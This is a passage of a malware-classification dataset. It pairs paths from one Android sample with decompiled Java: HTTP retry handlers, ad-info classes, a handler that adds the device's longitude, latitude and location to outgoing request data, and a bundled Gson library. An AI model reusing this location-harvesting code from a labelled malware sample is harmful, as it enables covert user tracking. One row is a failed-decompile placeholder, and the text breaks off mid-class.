"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\u.code","public class u extends AsyncHttpResponseHandler {   final BusinessDataContext a;   final SyncHttpClient b;   final String c;   final t d;   public u(  t tVar,  BusinessDataContext businessDataContext,  SyncHttpClient syncHttpClient,  String str){     this.d=tVar;     this.a=businessDataContext;     this.b=syncHttpClient;     this.c=str;   }   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     if (504 == i) {       this.b.post(this.a.getContext(),this.c,new ByteArrayEntity(this.a.getRequestByteData()),"""",new v(this));     }     this.a.setStateCode(i);   }   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     int i2=0;     this.a.setGzip(0);     int length=headerArr.length;     while (true) {       if (i2 >= length) {         break;       }       if (headerArr[i2].getName().equals(com.fw.tzthree.b.a.D)) {         this.a.setGzip(1);         break;       }       i2++;     }     this.a.setResponseByteData(bArr);     this.a.setStateCode(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\v.code","class v extends AsyncHttpResponseHandler {   final u a;   public v(  u uVar){     this.a=uVar;   }   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     if (504 == i) {       this.a.b.post(this.a.a.getContext(),this.a.c,new ByteArrayEntity(this.a.a.getRequestByteData()),"""",new w(this));     }     this.a.a.setStateCode(i);   }   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     int i2=0;     this.a.a.setGzip(0);     int length=headerArr.length;     while (true) {       if (i2 >= length) {         break;       }       if (headerArr[i2].getName().equals(com.fw.tzthree.b.a.D)) {         this.a.a.setGzip(1);         break;       }       i2++;     }     this.a.a.setResponseByteData(bArr);     this.a.a.setStateCode(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\w.code","class w extends AsyncHttpResponseHandler {   final v a;   public w(  v vVar){     this.a=vVar;   }   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     this.a.a.a.setStateCode(i);   }   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     int i2=0;     this.a.a.a.setGzip(0);     int length=headerArr.length;     while (true) {       if (i2 >= length) {         break;       }       if (headerArr[i2].getName().equals(com.fw.tzthree.b.a.D)) {         this.a.a.a.setGzip(1);         break;       }       i2++;     }     this.a.a.a.setResponseByteData(bArr);     this.a.a.a.setStateCode(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\x.code","public class x<T extends AdInfo> extends c<T> {   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     return businessDataContext.getDbHelper().o();   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\y.code","!org.eclipse.jdt.core.dom.TypeDeclaration@31196ccc"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\z.code","class z extends AsyncHttpResponseHandler {   final BusinessDataContext a;   final y b;   public z(  y yVar,  BusinessDataContext businessDataContext){     this.b=yVar;     this.a=businessDataContext;   }   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){   }   @Override public void onStart(){     super.onStart();   }   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     LocationInfo a=com.fw.tzthree.d.x.a(new ByteArrayInputStream(bArr));     if (1 == a.getStateCode()) {       StringBuffer stringBuffer=new StringBuffer();       stringBuffer.append(a.getLongitude());       stringBuffer.append(""*"");       stringBuffer.append(a.getLatitude());       stringBuffer.append(""*"");       stringBuffer.append(a.getLocation());       this.a.getRequestData().getDevice().setLocation(stringBuffer.toString());     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.b\a.code","public class a {   private static a a=null;   private ExecutorService b;   private a(){     this.b=null;     this.b=Executors.newFixedThreadPool(15);   }   public static a a(){     if (a == null) {       a=new a();     }     return a;   }   public void a(  Runnable runnable){     this.b.submit(runnable);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\DefaultDateTypeAdapter.code","final class DefaultDateTypeAdapter implements JsonDeserializer<Date>, JsonSerializer<Date> {   private final DateFormat enUsFormat;   private final DateFormat iso8601Format;   private final DateFormat localFormat;   DefaultDateTypeAdapter(){     this(DateFormat.getDateTimeInstance(2,2,Locale.US),DateFormat.getDateTimeInstance(2,2));   }   DefaultDateTypeAdapter(  int i){     this(DateFormat.getDateInstance(i,Locale.US),DateFormat.getDateInstance(i));   }   public DefaultDateTypeAdapter(  int i,  int i2){     this(DateFormat.getDateTimeInstance(i,i2,Locale.US),DateFormat.getDateTimeInstance(i,i2));   }   public DefaultDateTypeAdapter(  String str){     this(new SimpleDateFormat(str,Locale.US),new SimpleDateFormat(str));   }   DefaultDateTypeAdapter(  DateFormat dateFormat,  DateFormat dateFormat2){     this.enUsFormat=dateFormat;     this.localFormat=dateFormat2;     this.iso8601Format=new SimpleDateFormat(""yyyy-MM-dd'T'HH:mm:ss'Z'"",Locale.US);     this.iso8601Format.setTimeZone(TimeZone.getTimeZone(""UTC""));   }   private Date deserializeToDate(  JsonElement jsonElement){     Date parse; synchronized (this.localFormat) {       try {         parse=this.localFormat.parse(jsonElement.getAsString());       }  catch (      ParseException e) {         try {           parse=this.enUsFormat.parse(jsonElement.getAsString());         }  catch (        ParseException e2) {           try {             parse=this.iso8601Format.parse(jsonElement.getAsString());           }  catch (          ParseException e3) {             throw new JsonSyntaxException(jsonElement.getAsString(),e3);           }         }       }     }     return parse;   }   @Override public Date deserialize(  JsonElement jsonElement,  Type type,  JsonDeserializationContext jsonDeserializationContext){     if (!(jsonElement instanceof JsonPrimitive)) {       throw new JsonParseException(""The date should be a string value"");     }     Date deserializeToDate=deserializeToDate(jsonElement);     if (type == Date.class) {       return deserializeToDate;     }     if (type == Timestamp.class) {       return new Timestamp(deserializeToDate.getTime());     }     if (type == java.sql.Date.class) {       return new java.sql.Date(deserializeToDate.getTime());     }     throw new IllegalArgumentException(getClass() + "" cannot deserialize to "" + type);   }   @Override public JsonElement serialize(  Date date,  Type type,  JsonSerializationContext jsonSerializationContext){     JsonPrimitive jsonPrimitive; synchronized (this.localFormat) {       jsonPrimitive=new JsonPrimitive(this.enUsFormat.format(date));     }     return jsonPrimitive;   }   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(DefaultDateTypeAdapter.class.getSimpleName());     sb.append('(').append(this.localFormat.getClass().getSimpleName()).append(')');     return sb.toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\ExclusionStrategy.code","public interface ExclusionStrategy {   boolean shouldSkipClass(  Class<?> cls);   boolean shouldSkipField(  FieldAttributes fieldAttributes); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\FieldAttributes.code","public final class FieldAttributes {   private final Field field;   public FieldAttributes(  Field field){     C$Gson$Preconditions.checkNotNull(field);     this.field=field;   }   Object get(  Object obj){     return this.field.get(obj);   }   public <T extends Annotation>T getAnnotation(  Class<T> cls){     return (T)this.field.getAnnotation(cls);   }   public Collection<Annotation> getAnnotations(){     return Arrays.asList(this.field.getAnnotations());   }   public Class<?> getDeclaredClass(){     return this.field.getType();   }   public Type getDeclaredType(){     return this.field.getGenericType();   }   public Class<?> getDeclaringClass(){     return this.field.getDeclaringClass();   }   public String getName(){     return this.field.getName();   }   public boolean hasModifier(  int i){     return (this.field.getModifiers() & i) != 0;   }   boolean isSynthetic(){     return this.field.isSynthetic();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\FieldNamingStrategy.code","public interface FieldNamingStrategy {   String translateName(  Field field); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\FutureTypeAdapter.code","public class FutureTypeAdapter<T> extends TypeAdapter<T> {   private TypeAdapter<T> delegate;   FutureTypeAdapter(){   }   @Override public T read(  JsonReader jsonReader){     if (this.delegate == null) {       throw new IllegalStateException();     }     return this.delegate.read(jsonReader);   }   public void setDelegate(  TypeAdapter<T> typeAdapter){     if (this.delegate != null) {       throw new AssertionError();     }     this.delegate=typeAdapter;   }   @Override public void write(  JsonWriter jsonWriter,  T t){     if (this.delegate == null) {       throw new IllegalStateException();     }     this.delegate.write(jsonWriter,t);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\Gson.code","public final class Gson {   static final boolean DEFAULT_JSON_NON_EXECUTABLE=false;   private static final String JSON_NON_EXECUTABLE_PREFIX="")]}'\n"";   private final ThreadLocal<Map<TypeToken<?>,FutureTypeAdapter<?>>> calls;   private final ConstructorConstructor constructorConstructor;   final JsonDeserializationContext deserializationContext;   private final List<TypeAdapterFactory> factories;   private final boolean generateNonExecutableJson;   private final boolean htmlSafe;   private final boolean prettyPrinting;   final JsonSerializationContext serializationContext;   private final boolean serializeNulls;   private final Map<TypeToken<?>,TypeAdapter<?>> typeTokenCache; public class FutureTypeAdapter<T> extends TypeAdapter<T> {     private TypeAdapter<T> delegate;     FutureTypeAdapter(){     }     @Override public T read(    JsonReader jsonReader){       if (this.delegate == null) {         throw new IllegalStateException();       }       return this.delegate.read(jsonReader);     }     public void setDelegate(    TypeAdapter<T> typeAdapter){       if (this.delegate != null) {         throw new AssertionError();       }       this.delegate=typeAdapter;     }     @Override public void write(    JsonWriter jsonWriter,    T t){       if (this.delegate == null) {         throw new IllegalStateException();       }       this.delegate.write(jsonWriter,t);     }   }   public Gson(){     this(Excluder.DEFAULT,FieldNamingPolicy.IDENTITY,Collections.emptyMap(),DEFAULT_JSON_NON_EXECUTABLE,DEFAULT_JSON_NON_EXECUTABLE,DEFAULT_JSON_NON_EXECUTABLE,true,DEFAULT_JSON_NON_EXECUTABLE,DEFAULT_JSON_NON_EXECUTABLE,LongSerializationPolicy.DEFAULT,Collections.emptyList());   }   public Gson(  Excluder excluder,  FieldNamingStrategy fieldNamingStrategy,  Map<Type,InstanceCreator<?>> map,  boolean z,  boolean z2,  boolean z3,  boolean z4,  boolean z5,  boolean z6,  LongSerializationPolicy longSerializationPolicy,  List<TypeAdapterFactory> list){     this.calls=new ThreadLocal<>();     this.typeTokenCache=Collections.synchronizedMap(new HashMap());     this.deserializationContext=new JsonDeserializationContext(){       @Override public <T>T deserialize(      JsonElement jsonElement,      Type type){         return (T)Gson.this.fromJson(jsonElement,type);       }     } ;     this.serializationContext=new JsonSerializationContext(){       @Override public JsonElement serialize(      Object obj){         return Gson.this.toJsonTree(obj);       }       @Override public JsonElement serialize(      Object obj,      Type type){         return Gson.this.toJsonTree(obj,type);       }     } ;     this.constructorConstructor=new ConstructorConstructor(map);     this.serializeNulls=z;     this.generateNonExecutableJson=z3;     this.htmlSafe=z4;     this.prettyPrinting=z5;     ArrayList arrayList=new ArrayList();     arrayList.add(TypeAdapters.JSON_ELEMENT_FACTORY);     arrayList.add(ObjectTypeAdapter.FACTORY);     arrayList.add(excluder);     arrayList.addAll(list);     arrayList.add(TypeAdapters.STRING_FACTORY);     arrayList.add(TypeAdapters.INTEGER_FACTORY);     arrayList.add(TypeAdapters.BOOLEAN_FACTORY);     arrayList.add(TypeAdapters.BYTE_FACTORY);     arrayList.add(TypeAdapters.SHORT_FACTORY);     arrayList.add(TypeAdapters.newFactory(Long.TYPE,Long.class,longAdapter(longSerializationPolicy)));     arrayList.add(TypeAdapters.newFactory(Double.TYPE,Double.class,doubleAdapter(z6)));     arrayList.add(TypeAdapters.newFactory(Float.TYPE,Float.class,floatAdapter(z6)));     arrayList.add(TypeAdapters.NUMBER_FACTORY);     arrayList.add(TypeAdapters.CHARACTER_FACTORY);     arrayList.add(TypeAdapters.STRING_BUILDER_FACTORY);     arrayList.add(TypeAdapters.STRING_BUFFER_FACTORY);     arrayList.add(TypeAdapters.newFactory(BigDecimal.class,TypeAdapters.BIG_DECIMAL));     arrayList.add(TypeAdapters.newFactory(BigInteger.class,TypeAdapters.BIG_INTEGER));     arrayList.add(TypeAdapters.URL_FACTORY);     arrayList.add(TypeAdapters.URI_FACTORY);     arrayList.add(TypeAdapters.UUID_FACTORY);     arrayList.add(TypeAdapters.LOCALE_FACTORY);     arrayList.add(TypeAdapters.INET_ADDRESS_FACTORY);     arrayList.add(TypeAdapters.BIT_SET_FACTORY);     arrayList.add(DateTypeAdapter.FACTORY);     arrayList.add(TypeAdapters.CALENDAR_FACTORY);     arrayList.add(TimeTypeAdapter.FACTORY);     arrayList.add(SqlDateTypeAdapter.FACTORY);     arrayList.add(TypeAdapters.TIMESTAMP_FACTORY);     arrayList.add(ArrayTypeAdapter.FACTORY);     arrayList.add(TypeAdapters.ENUM_FACTORY);     arrayList.add(TypeAdapters.CLASS_FACTORY);     arrayList.add(new CollectionTypeAdapterFactory(this.constructorConstructor));     arrayList.add(new MapTypeAdapterFactory(this.constructorConstructor,z2));     arrayList.add(new ReflectiveTypeAdapterFactory(this.constructorConstructor,fieldNamingStrategy,excluder));     this.factories=Collections.unmodifiableList(arrayList);   }   private static void assertFullConsumption(  Object obj,  JsonReader jsonReader){     if (obj != null) {       try {         if (jsonReader.peek() != JsonToken.END_DOCUMENT) {           throw new JsonIOException(""JSON document was not fully consumed."");         }       }  catch (      MalformedJsonException e) {         throw new JsonSyntaxException(e);       } catch (      IOException e2) {         throw new JsonIOException(e2);       }     }   }   public void checkValidFloatingPoint(  double d){     if (Double.isNaN(d) || Double.isInfinite(d)) {       throw new IllegalArgumentException(d + "" is not a valid double value as per JSON specification. To override this behavior, use GsonBuilder.serializeSpecialFloatingPointValues() method."");     }   }   private TypeAdapter<Number> doubleAdapter(  boolean z){     return z ? TypeAdapters.DOUBLE : new TypeAdapter<Number>(){       @Override public Number read(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return Double.valueOf(jsonReader.nextDouble());         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      Number number){         if (number == null) {           jsonWriter.nullValue();           return;         }         Gson.this.checkValidFloatingPoint(number.doubleValue());         jsonWriter.value(number);       }     } ;   }   private TypeAdapter<Number> floatAdapter(  boolean z){     return z ? TypeAdapters.FLOAT : new TypeAdapter<Number>(){       @Override public Number read(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return Float.valueOf((float)jsonReader.nextDouble());         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      Number number){         if (number == null) {           jsonWriter.nullValue();           return;         }         Gson.this.checkValidFloatingPoint(number.floatValue());         jsonWriter.value(number);       }     } ;   }   private TypeAdapter<Number> longAdapter(  LongSerializationPolicy longSerializationPolicy){     return longSerializationPolicy == LongSerializationPolicy.DEFAULT ? TypeAdapters.LONG : new TypeAdapter<Number>(){       @Override public Number read(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return Long.valueOf(jsonReader.nextLong());         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      Number number){         if (number == null) {           jsonWriter.nullValue();         }  else {           jsonWriter.value(number.toString());         }       }     } ;   }   private JsonWriter newJsonWriter(  Writer writer){     if (this.generateNonExecutableJson) {       writer.write(JSON_NON_EXECUTABLE_PREFIX);     }     JsonWriter jsonWriter=new JsonWriter(writer);     if (this.prettyPrinting) {       jsonWriter.setIndent(""  "");     }     jsonWriter.setSerializeNulls(this.serializeNulls);     return jsonWriter;   }   public <T>T fromJson(  JsonElement jsonElement,  Class<T> cls){     return (T)Primitives.wrap(cls).cast(fromJson(jsonElement,(Type)cls));   }   public <T>T fromJson(  JsonElement jsonElement,  Type type){     if (jsonElement == null) {       return null;     }     return (T)fromJson(new JsonTreeReader(jsonElement),type);   }   public <T>T fromJson(  JsonReader jsonReader,  Type type){     boolean z=true;     boolean isLenient=jsonReader.isLenient();     jsonReader.setLenient(true);     try {       try {         jsonReader.peek();         z=DEFAULT_JSON_NON_EXECUTABLE;         T read=getAdapter(TypeToken.get(type)).read(jsonReader);         jsonReader.setLenient(isLenient);         return read;       }  catch (      EOFException e) {         if (!z) {           throw new JsonSyntaxException(e);         }         jsonReader.setLenient(isLenient);         return null;       } catch (      IOException e2) {         throw new JsonSyntaxException(e2);       } catch (      IllegalStateException e3) {         throw new JsonSyntaxException(e3);       }     }  catch (    Throwable th) {       jsonReader.setLenient(isLenient);       throw th;     }   }   public <T>T fromJson(  Reader reader,  Class<T> cls){     JsonReader jsonReader=new JsonReader(reader);     Object fromJson=fromJson(jsonReader,cls);     assertFullConsumption(fromJson,jsonReader);     return (T)Primitives.wrap(cls).cast(fromJson);   }   public <T>T fromJson(  Reader reader,  Type type){     JsonReader jsonReader=new JsonReader(reader);     T t=(T)fromJson(jsonReader,type);     assertFullConsumption(t,jsonReader);     return t;   }   public <T>T fromJson(  String str,  Class<T> cls){     return (T)Primitives.wrap(cls).cast(fromJson(str,(Type)cls));   }   public <T>T fromJson(  String str,  Type type){     if (str == null) {       return null;     }     return (T)fromJson(new StringReader(str),type);   }   public <T>TypeAdapter<T> getAdapter(  TypeToken<T> typeToken){     Map map;     TypeAdapter<T> typeAdapter=(TypeAdapter)this.typeTokenCache.get(typeToken);     if (typeAdapter == null) {       Map<TypeToken<?>,FutureTypeAdapter<?>> map2=this.calls.get();       boolean z=DEFAULT_JSON_NON_EXECUTABLE;       if (map2 == null) {         HashMap hashMap=new HashMap();         this.calls.set(hashMap);         map=hashMap;         z=true;       }  else {         map=map2;       }       typeAdapter=(FutureTypeAdapter)map.get(typeToken);       if (typeAdapter == null) {         try {           FutureTypeAdapter futureTypeAdapter=new FutureTypeAdapter();           map.put(typeToken,futureTypeAdapter);           Iterator<TypeAdapterFactory> it=this.factories.iterator();           while (it.hasNext()) {             typeAdapter=it.next().create(this,typeToken);             if (typeAdapter != null) {               futureTypeAdapter.setDelegate(typeAdapter);               this.typeTokenCache.put(typeToken,typeAdapter);               map.remove(typeToken);               if (z) {                 this.calls.remove();               }             }           }           throw new IllegalArgumentException(""GSON cannot handle "" + typeToken);         }  catch (        Throwable th) {           map.remove(typeToken);           if (z) {             this.calls.remove();           }           throw th;         }       }     }     return typeAdapter;   }   public <T>TypeAdapter<T> getAdapter(  Class<T> cls){     return getAdapter(TypeToken.get((Class)cls));   }   public <T>TypeAdapter<T> getDelegateAdapter(  TypeAdapterFactory typeAdapterFactory,  TypeToken<T> typeToken){     boolean z=false;     for (    TypeAdapterFactory typeAdapterFactory2 : this.factories) {       if (z) {         TypeAdapter<T> create=typeAdapterFactory2.create(this,typeToken);         if (create != null) {           return create;         }       }  else       if (typeAdapterFactory2 == typeAdapterFactory) {         z=true;       }     }     throw new IllegalArgumentException(""GSON cannot serialize "" + typeToken);   }   public String toJson(  JsonElement jsonElement){     StringWriter stringWriter=new StringWriter();     toJson(jsonElement,(Appendable)stringWriter);     return stringWriter.toString();   }   public String toJson(  Object obj){     return obj == null ? toJson((JsonElement)JsonNull.INSTANCE) : toJson(obj,obj.getClass());   }   public String toJson(  Object obj,  Type type){     StringWriter stringWriter=new StringWriter();     toJson(obj,type,stringWriter);     return stringWriter.toString();   }   public void toJson(  JsonElement jsonElement,  JsonWriter jsonWriter){     boolean isLenient=jsonWriter.isLenient();     jsonWriter.setLenient(true);     boolean isHtmlSafe=jsonWriter.isHtmlSafe();     jsonWriter.setHtmlSafe(this.htmlSafe);     boolean serializeNulls=jsonWriter.getSerializeNulls();     jsonWriter.setSerializeNulls(this.serializeNulls);     try {       try {         Streams.write(jsonElement,jsonWriter);       }  catch (      IOException e) {         throw new JsonIOException(e);       }     }   finally {       jsonWriter.setLenient(isLenient);       jsonWriter.setHtmlSafe(isHtmlSafe);       jsonWriter.setSerializeNulls(serializeNulls);     }   }   public void toJson(  JsonElement jsonElement,  Appendable appendable){     try {       toJson(jsonElement,newJsonWriter(Streams.writerForAppendable(appendable)));     }  catch (    IOException e) {       throw new RuntimeException(e);     }   }   public void toJson(  Object obj,  Appendable appendable){     if (obj != null) {       toJson(obj,obj.getClass(),appendable);     }  else {       toJson((JsonElement)JsonNull.INSTANCE,appendable);     }   }   public void toJson(  Object obj,  Type type,  JsonWriter jsonWriter){     TypeAdapter adapter=getAdapter(TypeToken.get(type));     boolean isLenient=jsonWriter.isLenient();     jsonWriter.setLenient(true);     boolean isHtmlSafe=jsonWriter.isHtmlSafe();     jsonWriter.setHtmlSafe(this.htmlSafe);     boolean serializeNulls=jsonWriter.getSerializeNulls();     jsonWriter.setSerializeNulls(this.serializeNulls);     try {       try {         adapter.write(jsonWriter,obj);       }  catch (      IOException e) {         throw new JsonIOException(e);       }     }   finally {       jsonWriter.setLenient(isLenient);       jsonWriter.setHtmlSafe(isHtmlSafe);       jsonWriter.setSerializeNulls(serializeNulls);     }   }   public void toJson(  Object obj,  Type type,  Appendable appendable){     try {       toJson(obj,type,newJsonWriter(Streams.writerForAppendable(appendable)));     }  catch (    IOException e) {       throw new JsonIOException(e);     }   }   public JsonElement toJsonTree(  Object obj){     return obj == null ? JsonNull.INSTANCE : toJsonTree(obj,obj.getClass());   }   public JsonElement toJsonTree(  Object obj,  Type type){     JsonTreeWriter jsonTreeWriter=new JsonTreeWriter();     toJson(obj,type,jsonTreeWriter);     return jsonTreeWriter.get();   }   public String toString(){     return ""{serializeNulls:"" + this.serializeNulls + ""factories:""+ this.factories+ "",instanceCreators:""+ this.constructorConstructor+ ""}"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\GsonBuilder.code","public final class GsonBuilder {   private boolean complexMapKeySerialization;   private String datePattern;   private boolean generateNonExecutableJson;   private boolean prettyPrinting;   private boolean serializeNulls;   private boolean serializeSpecialFloatingPointValues;   private Excluder excluder=Excluder.DEFAULT;   private LongSerializationPolicy longSerializationPolicy=LongSerializationPolicy.DEFAULT;   private FieldNamingStrategy fieldNamingPolicy=FieldNamingPolicy.IDENTITY;   private final Map<Type,InstanceCreator<?>> instanceCreators=new HashMap();   private final List<TypeAdapterFactory> factories=new ArrayList();   private final List<TypeAdapterFactory> hierarchyFactories=new ArrayList();   private int dateStyle=2;   private int timeStyle=2;   private boolean escapeHtmlChars=true;   private void addTypeAdaptersForDate(  String str,  int i,  int i2,  List<TypeAdapterFactory> list){     DefaultDateTypeAdapter defaultDateTypeAdapter;     if (str != null && !"""".equals(str.trim())) {       defaultDateTypeAdapter=new DefaultDateTypeAdapter(str);     }  else     if (i == 2 || i2 == 2) {       return;     }  else {       defaultDateTypeAdapter=new DefaultDateTypeAdapter(i,i2);     }     list.add(TreeTypeAdapter.newFactory(TypeToken.get(Date.class),defaultDateTypeAdapter));     list.add(TreeTypeAdapter.newFactory(TypeToken.get(Timestamp.class),defaultDateTypeAdapter));     list.add(TreeTypeAdapter.newFactory(TypeToken.get(java.sql.Date.class),defaultDateTypeAdapter));   }   public GsonBuilder addDeserializationExclusionStrategy(  ExclusionStrategy exclusionStrategy){     this.excluder=this.excluder.withExclusionStrategy(exclusionStrategy,false,true);     return this;   }   public GsonBuilder addSerializationExclusionStrategy(  ExclusionStrategy exclusionStrategy){     this.excluder=this.excluder.withExclusionStrategy(exclusionStrategy,true,false);     return this;   }   public Gson create(){     ArrayList arrayList=new ArrayList();     arrayList.addAll(this.factories);     Collections.reverse(arrayList);     arrayList.addAll(this.hierarchyFactories);     addTypeAdaptersForDate(this.datePattern,this.dateStyle,this.timeStyle,arrayList);     return new Gson(this.excluder,this.fieldNamingPolicy,this.instanceCreators,this.serializeNulls,this.complexMapKeySerialization,this.generateNonExecutableJson,this.escapeHtmlChars,this.prettyPrinting,this.serializeSpecialFloatingPointValues,this.longSerializationPolicy,arrayList);   }   public GsonBuilder disableHtmlEscaping(){     this.escapeHtmlChars=false;     return this;   }   public GsonBuilder disableInnerClassSerialization(){     this.excluder=this.excluder.disableInnerClassSerialization();     return this;   }   public GsonBuilder enableComplexMapKeySerialization(){     this.complexMapKeySerialization=true;     return this;   }   public GsonBuilder excludeFieldsWithModifiers(  int... iArr){     this.excluder=this.excluder.withModifiers(iArr);     return this;   }   public GsonBuilder excludeFieldsWithoutExposeAnnotation(){     this.excluder=this.excluder.excludeFieldsWithoutExposeAnnotation();     return this;   }   public GsonBuilder generateNonExecutableJson(){     this.generateNonExecutableJson=true;     return this;   }   public GsonBuilder registerTypeAdapter(  Type type,  Object obj){     C$Gson$Preconditions.checkArgument((obj instanceof JsonSerializer) || (obj instanceof JsonDeserializer) || (obj instanceof InstanceCreator)|| (obj instanceof TypeAdapter));     if (obj instanceof InstanceCreator) {       this.instanceCreators.put(type,(InstanceCreator)obj);     }     if ((obj instanceof JsonSerializer) || (obj instanceof JsonDeserializer)) {       this.factories.add(TreeTypeAdapter.newFactoryWithMatchRawType(TypeToken.get(type),obj));     }     if (obj instanceof TypeAdapter) {       this.factories.add(TypeAdapters.newFactory(TypeToken.get(type),(TypeAdapter)obj));     }     return this;   }   public GsonBuilder registerTypeAdapterFactory(  TypeAdapterFactory typeAdapterFactory){     this.factories.add(typeAdapterFactory);     return this;   }   public GsonBuilder registerTypeHierarchyAdapter(  Class<?> cls,  Object obj){     C$Gson$Preconditions.checkArgument((obj instanceof JsonSerializer) || (obj instanceof JsonDeserializer) || (obj instanceof TypeAdapter));     if ((obj instanceof JsonDeserializer) || (obj instanceof JsonSerializer)) {       this.hierarchyFactories.add(0,TreeTypeAdapter.newTypeHierarchyFactory(cls,obj));     }     if (obj instanceof TypeAdapter) {       this.factories.add(TypeAdapters.newTypeHierarchyFactory(cls,(TypeAdapter)obj));     }     return this;   }   public GsonBuilder serializeNulls(){     this.serializeNulls=true;     return this;   }   public GsonBuilder serializeSpecialFloatingPointValues(){     this.serializeSpecialFloatingPointValues=true;     return this;   }   public GsonBuilder setDateFormat(  int i){     this.dateStyle=i;     this.datePattern=null;     return this;   }   public GsonBuilder setDateFormat(  int i,  int i2){     this.dateStyle=i;     this.timeStyle=i2;     this.datePattern=null;     return this;   }   public GsonBuilder setDateFormat(  String str){     this.datePattern=str;     return this;   }   public GsonBuilder setExclusionStrategies(  ExclusionStrategy... exclusionStrategyArr){     for (    ExclusionStrategy exclusionStrategy : exclusionStrategyArr) {       this.excluder=this.excluder.withExclusionStrategy(exclusionStrategy,true,true);     }     return this;   }   public GsonBuilder setFieldNamingPolicy(  FieldNamingPolicy fieldNamingPolicy){     this.fieldNamingPolicy=fieldNamingPolicy;     return this;   }   public GsonBuilder setFieldNamingStrategy(  FieldNamingStrategy fieldNamingStrategy){     this.fieldNamingPolicy=fieldNamingStrategy;     return this;   }   public GsonBuilder setLongSerializationPolicy(  LongSerializationPolicy longSerializationPolicy){     this.longSerializationPolicy=longSerializationPolicy;     return this;   }   public GsonBuilder setPrettyPrinting(){     this.prettyPrinting=true;     return this;   }   public GsonBuilder setVersion(  double d){     this.excluder=this.excluder.withVersion(d);     return this;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\InstanceCreator.code","public interface InstanceCreator<T> {   T createInstance(  Type type); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.com.google.gson\JsonArray.code","public final class JsonArray extends JsonElement implements Iterable<JsonElement> {   private final List<JsonElement> elements=new ArrayList();   public void add(  JsonElement jsonElement){     if (jsonElement == null) {       jsonElement=JsonNull.INSTANCE;     }     this.elements.add(jsonElement);   }   public void addAll(  JsonArray jsonArray){     this.elements.addAll(jsonArray.elements);   }   @Override public JsonArray deepCopy(){     JsonArray jsonArray=new JsonArray();     Iterator<JsonElement> it=this.elements.iterator();     while (it.hasNext()) {       jsonArray.add(it.next().deepCopy());     }     return jsonArray;   }   public boolean equals(  Object obj){     return obj == this || ((obj instanceof JsonArray) && ((JsonArray)obj).elements.equals(this.elements));   }   public JsonElement get(  int i){     return this.elements.get(i);   }   @Override public BigDecimal getAsBigDecimal(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsBigDecimal();     }     throw new IllegalStateException();   }   @Override public BigInteger getAsBigInteger(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsBigInteger();     }     throw new IllegalStateException();   }   @Override public boolean getAsBoolean(){     if (this.elements.size() == 1) {       return this.elements.get(0).getAsBoolean();     }     throw new IllegalStateException();   }   @Override public byte getAsByte(){     if (this.elements.size() == 1) {       